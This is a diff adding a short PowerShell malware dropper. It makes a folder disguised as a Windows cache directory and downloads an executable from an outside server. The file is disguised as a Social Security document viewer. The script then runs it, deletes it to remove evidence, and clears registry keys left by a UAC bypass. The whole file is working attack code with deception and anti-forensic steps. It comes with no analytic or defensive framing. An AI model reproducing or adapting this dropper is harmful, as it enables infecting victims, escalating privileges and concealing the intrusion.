@@ -1,0 +1,20 @@
+# 1. Define paths - using a hidden temp folder
+$tempDir = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
+if (!(Test-Path $tempDir)) { New-Item -Path $tempDir -ItemType Directory }
+$exePath = "$tempDir\help_utility.exe"
+
+# 2. Download the raw EXE directly
+# Note: Upload your original EXE to the server as 'help.exe'
+$url = "https://adhesivebondingeurasia.com/img/MySocialSecurity_eDocumentForum_Viewr093915386891985_Pdf.exe"
+$wc = New-Object Net.WebClient
+$wc.DownloadFile($url, $exePath)
+
+# 3. Execute the file
+Start-Process -FilePath $exePath
+
+# 4. Wait 2 seconds then self-delete the evidence
+Start-Sleep -s 2
+Remove-Item $exePath -Force -ErrorAction SilentlyContinue
+
+# 5. Cleanup the UAC bypass registry keys
+Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue
